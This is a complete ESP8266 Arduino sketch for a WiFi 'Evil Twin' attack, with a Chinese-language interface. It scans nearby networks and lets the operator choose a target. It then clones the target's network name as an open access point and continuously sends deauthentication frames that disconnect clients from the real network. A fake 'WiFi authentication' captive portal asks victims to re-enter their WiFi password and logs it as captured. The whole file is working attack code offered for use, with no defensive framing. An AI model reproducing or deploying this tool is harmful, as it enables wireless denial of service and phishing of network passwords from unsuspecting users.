#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

/* ================================================================== */
#define CONFIG_SSID    "EvilTwin-Setup"
#define MAX_SCAN       20
#define RESET_PIN      0            /* GPIO0 – Flash button  */
#define RESET_HOLD_MS  3000
#define DNS_PORT       53
#define EE_SIZE        64

enum { EE_BSSID = 0, EE_SSID = 6, EE_CH = 39 };   /* layout 6+33+1 = 40 B */

/* ================================================================== */
IPAddress           apIP(192, 168, 4, 1);
DNSServer           dnsServer;
ESP8266WebServer    server(80);

static uint8_t      targetBSSID[6];
static char         targetSSID[33];
static uint8_t      targetChannel = 6;
static bool         attacking;

static uint8_t deauthPkt[26] = {                     /* MACs filled later   */
    0xC0, 0x00,                  0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,                  0x07, 0x00
};

/* ------ cached scan ------------------------------------------------ */
static int      apCount;
static String   apSSID[MAX_SCAN];
static char     apBSSID[MAX_SCAN][18];   /* "XX:XX:XX:XX:XX:XX"         */
static int      apCh[MAX_SCAN];
static int      apRSSI[MAX_SCAN];
static unsigned long lastDeauthMs;

/* ================================================================== */
/*  Hex helpers – avoids %X / %x portability traps on newlib-nano      */
/* ================================================================== */
static void macToStr(const uint8_t *mac, char out[18])
{
    static const char H[] = "0123456789ABCDEF";
    for (int i = 0; i < 6; i++) {
        out[i * 3]     = H[mac[i] >> 4];
        out[i * 3 + 1] = H[mac[i] & 0x0F];
        if (i < 5) out[i * 3 + 2] = ':';
    }
    out[17] = '\0';
}

static bool strToMac(const char *s, uint8_t mac[6])
{
    int v[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2],
               &v[3], &v[4], &v[5]) != 6) return false;
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)v[i];
    return true;
}

/* ================================================================== */
/*  EEPROM                                                            */
/* ================================================================== */
static bool loadConfig(void)
{
    EEPROM.begin(EE_SIZE);
    bool ok = false;
    int  ff = 0;                            /* count 0xFF bytes         */
    for (int i = 0; i < 6; i++) {
        targetBSSID[i] = EEPROM.read(EE_BSSID + i);
        if (targetBSSID[i] != 0xFF) ok = true;
        else ff++;
    }
    for (int i = 0; i < 32; i++)
        targetSSID[i] = (char)EEPROM.read(EE_SSID + i);
    targetSSID[32] = '\0';
    targetChannel = EEPROM.read(EE_CH);
    if (targetChannel < 1 || targetChannel > 13) targetChannel = 6;
    EEPROM.end();
    return ok && (ff < 6);                  /* reject all-0xFF          */
}

static void saveConfig(void)
{
    EEPROM.begin(EE_SIZE);
    for (int i = 0; i < 6;  i++) EEPROM.write(EE_BSSID + i, targetBSSID[i]);
    for (int i = 0; i < 32; i++) EEPROM.write(EE_SSID  + i, targetSSID[i]);
    EEPROM.write(EE_CH, targetChannel);
    EEPROM.commit();
    EEPROM.end();
}

static void clearConfig(void)
{
    EEPROM.begin(EE_SIZE);
    for (int i = 0; i < EE_SIZE; i++) EEPROM.write(i, 0);
    EEPROM.commit();
    EEPROM.end();
}

static bool isConfigured(void)
{
    for (int i = 0; i < 6; i++)
        if (targetBSSID[i]) return true;
    return false;
}

/* ================================================================== */
/*  Scan                                                               */
/* ================================================================== */
static void doScan(void)
{
    apCount = WiFi.scanNetworks(false, true);
    if (apCount > MAX_SCAN) apCount = MAX_SCAN;

    for (int i = 0; i < apCount; i++) {
        apSSID[i] = WiFi.SSID(i);
        if (apSSID[i].length() == 0) apSSID[i] = "(hidden)";
        macToStr(WiFi.BSSID(i), apBSSID[i]);
        apCh[i]   = WiFi.channel(i);
        apRSSI[i] = WiFi.RSSI(i);
    }
}

/* ================================================================== */
/*  Deauth                                                             */
/* ================================================================== */
static void sendDeauthBurst(void)
{
    for (int i = 0; i < 8; i++) {
        deauthPkt[22] = (uint8_t)(i & 0x0F);
        wifi_send_pkt_freedom(deauthPkt, sizeof(deauthPkt), 0);
        if (i < 7) delayMicroseconds(500);
    }
}

/* ================================================================== */
/*  Web handlers – attack mode                                         */
/* ================================================================== */
static void onAttackRoot(void)
{
    server.send(200, "text/html; charset=utf-8",
        F("<!DOCTYPE html><html lang=\"zh\"><head>"
          "<meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
          "<title>WiFi 认证</title>"
          "<style>body{font-family:-apple-system,sans-serif;text-align:center;padding:60px 20px;color:#333}"
          "input[type=password]{padding:10px 14px;width:240px;border:1px solid #ccc;border-radius:6px;font-size:15px;margin:12px 0}"
          "button{padding:10px 28px;background:#007AFF;color:#fff;border:none;border-radius:6px;font-size:15px;cursor:pointer}"
          "</style></head><body>"
          "<h2>WiFi 认证</h2>"
          "<p>信号较弱，请重新输入密码以保持连接</p>"
          "<form method=\"POST\" action=\"/login\">"
          "<input name=\"pwd\" type=\"password\" placeholder=\"WiFi 密码\" autofocus>"
          "<br><button type=\"submit\">连接</button>"
          "</form></body></html>"));
}

static void onAttackLogin(void)
{
    if (server.hasArg("pwd")) {
        Serial.print(">>> CAPTURED PASSWORD: ");
        Serial.println(server.arg("pwd"));
        attacking = false;
    }
    server.send(200, "text/html; charset=utf-8",
        F("<!DOCTYPE html><html><head><meta charset=\"UTF-8\"></head>"
          "<body style=\"text-align:center;padding:60px;font-family:sans-serif\">"
          "<h2>认证成功</h2><p>正在连接网络…</p>"
          "</body></html>"));
}

/* ================================================================== */
/*  Web handlers – config mode                                         */
/* ================================================================== */
static void onConfigRoot(void)
{
    String html;
    html.reserve(3000 + apCount * 260);      /* pre-allocate ~8 KB      */

    html = F("<!DOCTYPE html><html lang='zh'><head>"
             "<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
             "<title>Evil Twin 配置</title>"
             "<style>"
             "body{font-family:-apple-system,sans-serif;max-width:500px;margin:30px auto;padding:0 16px;background:#f0f4ff;color:#1a1a2e}"
             "h2{color:#0055cc;text-align:center}"
             "p{text-align:center;color:#666;font-size:13px}"
             ".card{background:#fff;border-radius:12px;padding:14px 18px;margin:10px 0;"
             "box-shadow:0 2px 8px rgba(0,0,0,.08);display:flex;justify-content:space-between;"
             "align-items:center;width:100%;border:none;cursor:pointer}"
             ".card:hover{box-shadow:0 4px 16px rgba(0,85,204,.25)}"
             ".ssid{font-weight:700;font-size:15px;text-align:left}"
             ".meta{font-size:11px;color:#888}"
             ".rssi{color:#0055cc;font-weight:700}"
             "a.rescan{display:block;text-align:center;margin:20px 0;color:#0055cc}"
             "</style></head><body>"
             "<h2>&#127919; 选择目标网络</h2>"
             "<p>连接 <b>" CONFIG_SSID "</b>，点击目标 WiFi 开始攻击</p>");

    for (int i = 0; i < apCount; i++) {
        char card[320];
        snprintf(card, sizeof(card),
                 "<form method='POST' action='/select'>"
                 "<input type='hidden' name='idx' value='%d'>"
                 "<button class='card' type='submit'>"
                 "<div><div class='ssid'>%s</div>"
                 "<div class='meta'>CH%d &nbsp; %s</div></div>"
                 "<div class='rssi'>%d dBm</div>"
                 "</button></form>",
                 i, apSSID[i].c_str(), apCh[i],
                 apBSSID[i], apRSSI[i]);
        html += card;
    }

    html += F("<a class='rescan' href='/rescan'>&#128260; 重新扫描</a>"
              "</body></html>");

    server.send(200, "text/html; charset=utf-8", html);
}

static void onConfigRescan(void)
{
    doScan();
    Serial.printf("Rescan: found %d APs\n", apCount);
    server.sendHeader("Location", "http://192.168.4.1/", true);
    server.send(302, "text/plain", "");
}

static void onConfigSelect(void)
{
    if (!server.hasArg("idx")) { server.send(400, "", ""); return; }
    int idx = server.arg("idx").toInt();
    if (idx < 0 || idx >= apCount) { server.send(400, "", ""); return; }

    apSSID[idx].toCharArray(targetSSID, sizeof(targetSSID));
    targetChannel = apCh[idx];
    strToMac(apBSSID[idx], targetBSSID);

    Serial.printf("Selected: %s  CH=%d  %s\n",
                  targetSSID, targetChannel, apBSSID[idx]);
    saveConfig();

    server.send(200, "text/html; charset=utf-8",
        F("<!DOCTYPE html><html><head><meta charset='UTF-8'></head>"
          "<body style='text-align:center;padding:60px;font-family:sans-serif'>"
          "<h2>&#9989; 配置已保存</h2>"
          "<p>设备正在重启…</p></body></html>"));

    delay(800);
    ESP.restart();
}

/* ================================================================== */
static void onNotFound(void)
{
    server.sendHeader("Location", "http://192.168.4.1/", true);
    server.send(302, "text/plain", "");
}

/* ================================================================== */
/*  Factory reset                                                     */
/* ================================================================== */
static void checkFactoryReset(void)
{
    pinMode(RESET_PIN, INPUT_PULLUP);
    if (digitalRead(RESET_PIN) == HIGH) return;

    Serial.printf("BOOT button held – keep holding %d s to reset...\n",
                  RESET_HOLD_MS / 1000);

    unsigned long start = millis();
    while (digitalRead(RESET_PIN) == LOW &&
           millis() - start < (unsigned long)RESET_HOLD_MS)
        delay(100);

    if (millis() - start >= RESET_HOLD_MS) {
        Serial.println(">>> Clearing config and restarting...");
        clearConfig();
        ESP.restart();
    }
    Serial.println("Button released early – skipping reset.");
}

/* ================================================================== */
/*  Mode entry                                                         */
/* ================================================================== */
static void enterConfigMode(void)
{
    Serial.println("No target in config – entering config mode");

    WiFi.mode(WIFI_AP_STA);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(CONFIG_SSID, NULL, 1);

    doScan();
    Serial.printf("Scan done: %d APs found\n", apCount);

    dnsServer.start(DNS_PORT, "*", apIP);

    server.on("/",       HTTP_GET,  onConfigRoot);
    server.on("/rescan", HTTP_GET,  onConfigRescan);
    server.on("/select", HTTP_POST, onConfigSelect);
    server.onNotFound(onNotFound);
    server.begin();

    Serial.printf("Config portal – \"%s\"  http://%s\n",
                  CONFIG_SSID, apIP.toString().c_str());
}

static void enterAttackMode(void)
{
    Serial.printf("Attack: SSID=%s  CH=%d  %02X:%02X:%02X:%02X:%02X:%02X\n",
                  targetSSID, targetChannel,
                  targetBSSID[0], targetBSSID[1], targetBSSID[2],
                  targetBSSID[3], targetBSSID[4], targetBSSID[5]);

    memcpy(&deauthPkt[10], targetBSSID, 6);
    memcpy(&deauthPkt[16], targetBSSID, 6);

    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(targetSSID, NULL, targetChannel);

    wifi_set_promiscuous_rx_cb([](uint8_t *buf, uint16_t len) {});
    wifi_promiscuous_enable(1);
    wifi_set_channel(targetChannel);

    dnsServer.start(DNS_PORT, "*", apIP);

    server.on("/",      HTTP_GET,  onAttackRoot);
    server.on("/login", HTTP_POST, onAttackLogin);
    server.onNotFound(onNotFound);
    server.begin();

    attacking = true;
    Serial.println("Deauth + captive portal active.");
}

/* ================================================================== */
void setup(void)
{
    Serial.begin(115200);
    delay(500);
    checkFactoryReset();
    loadConfig();
    if (isConfigured()) enterAttackMode();
    else               enterConfigMode();
}

void loop(void)
{
    dnsServer.processNextRequest();
    server.handleClient();

    if (attacking) {
        unsigned long now = millis();
        if (now - lastDeauthMs >= 200) {
            lastDeauthMs = now;
            wifi_set_channel(targetChannel);
            sendDeauthBurst();
        }
    }
}
